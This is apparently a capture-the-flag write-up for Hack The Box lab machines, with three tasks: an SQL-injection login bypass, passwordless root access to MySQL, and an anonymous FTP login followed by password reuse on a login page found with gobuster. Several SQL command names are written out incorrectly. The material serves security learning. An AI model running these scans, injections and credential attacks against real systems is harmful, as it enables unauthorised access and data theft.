## Task 1

### 🗄️ Structured Query Language (SQL)

### What is SQL Injection?

SQL Injection is a type of vulnerability that allows attackers to interfere with the queries an application makes to its database. It can be used to:

-  **Bypass login authentication**
-  **View, modify, or delete data in the database**
-  **Perform administrative operations**
-  **Even gain full control over the server**

The top 10 classification SQL injection, A03: 2021-Injection have high risks.

### Process of task 1
1. Scan port using nmap to the target machine cause we need to get the information of the port:
    ```bash
    nmap -sV -Pn 10.129.183.140
    ```
   ![scan port](./image/Task1_scan.jpg)

   From this image , it shows that there is one port open which is tcp and the service is http.

   This means that it is a website.
   
2. I tried to open the wesite to check if it is work or not and we found that we can get into the website:
   ```bash
   http://10.129.183.140
   ```
    ![scan port](./image/Task1_login.jpg)
   
3. I tried to use the method of SQL injection by using  '1 = 1;--' , which means let login always true.
   
   This works because `1 = 1` is always true, and the `--` sequence comments out the rest of the SQL query.
   
   This tricks the application into logging you in without a valid password.
   
   And i found that i can log into the website , and then we get the flag.
   
    ```bash
    #i type 1=1; -- in the login part and log in successfully
   1 = 1; -- 
   ```
![scan port](./image/Task1_get_flag.jpg)

--

### Task 2 
### Process of solving task 2
1. We need to scan the target mechine (10.129.124.197) and get the port information by using nmap.
   At first , i tried nmap to scan the target mechine and i found that it is too slow.
   ```bash
    sudo nmap -p- -Pn -sV 10.129.124.197
   ```
   Therefore, i added '--min-rate=1000' to increase the scanning speed.
   
   ```bash
    sudo nmap -p- -Pn --min-rate=1000 -sV 10.129.124.197
    ```
   ![scan port](./image/Task2_scan.jpg)
   
2. According to the response, we can know that the service is mysql. So we need to find the command of mysql.
    ```bash
    #'-u root' means use the username root
    #'-h' means connect to the IP address which is 10.129.124.197
    mysql -u root -h 10.129.124.197
    ```
 ![scan port](./image/Task2_mysql.jpg)

The response shows that it connect to mysql server.

3. When we connect to mysql server, it will not automatically get into any database.
  
   So we need to use SHOWDATABASE to see what's database inside.

   **SHOWDATABASE** this is a tool to list all databases the current user has permission to see.

   ![scan port](./image/Task2_show_database.jpg)

    From this response , we can see there are 4 different databases inside. 

4. **USE<database_name>** this is to use a spefic use of the database.

    I tried htb so i type 
    ```bash
    USE<htb>
    ```
    and it turned into the htb database.

5. **SHOWTABLE** we need to know how many tables in the database, so we use SHOWTABLE to see the tables in the database.
    ```bash
    SHOWTABLE
    ```
    ![scan port](./image/Task2_show_tables.jpg)

   From the result , we can see there are 2 different tables (config and user) in htb database.

6. **SELECT * FROM** This is a tool to select all the files in the tables.
    ```bash
    #select all the files in the config table
    SELECT * FROM config
    ```

   ![scan port](./image/Task2_select_from.jpg)

According to the result, we can find the flag:  7b4bec00d1a39e3dd4e021ec3d915da8 .

-- 

### Task 3
### Process of solving Task 3
1. use nmap to scan the port
   ```bash
    # Target machine: 10.129.1.15
    # sudo: required because -sS (SYN scan) needs raw socket access
    # -p-: scan all TCP ports (not just the default 1000)
    # -sS: SYN scan (faster and more stealthy than a full TCP connect scan)
    # -Pn: skip host discovery (assume the host is up even if ping fails)
    # --min-rate=1000: send at least 1000 packets per second to speed up scanning
    # -oN: save the output in normal text format to full_scan.txt for later reference
    sudo nmap -p- -sS -Pn --min-rate=1000 -oN full_scan.txt 10.129.1.15
    ```
2. After scanning the port , i got the result of
   ```bash
   21/tcp  open  ftp
   ```

   This means that there is a port open and the service of the port is ftp.

   Therefore, we use ftp command.

3. login ftp to the traget mechine:

    ```bash
   ftp 10.129.1.15
   ```

    We get the response and use anonymous
   
    ```bash
    Name: anonymous  
    Password: <press enter>
    ```
    -> 230 Login successful

4. After log in , i use 'ls' to show all documents in ftp.
   we get two different documents: One is allowed.userlist, and the other is              allowed.userlist.passwd.

   I used 'CAT' command to download the documents.

    ```bash
    cat allowed.userlist
    cat allowed.userlist.passwd
    ```
    
5. After download the allowed.userlist.passwd, i found that there are three different password     at allowed.userlist.passwd.
    ![scan port](./image/Task3_cat_allowed.jpg)

6. I tried http://10.129.15 and found that can not open the website, because we got the         password and the admin so i think that it might have some login website in the target mechine.
   I used Gobuster to find the login page.
    ```bash
    gobuster dir -u http://10.129.1.15 -w /usr/share/wordlists/dirb/common.txt -x php
    ```

   The result shows: 
   ```bash
   Found: login.php
   ```
   This means it have another website called login.php

   Therefore, i type http://10.129.1.15/login.php and opened the website
    ![scan port](./image/Task3_sign_in.jpg)

7. I tried to type the login user: admin , and tried three passwords that i found before:

   And then i got the flag:

   ![scan port](./image/Task3_get_flag.jpg)

--

### Task 4

   
   
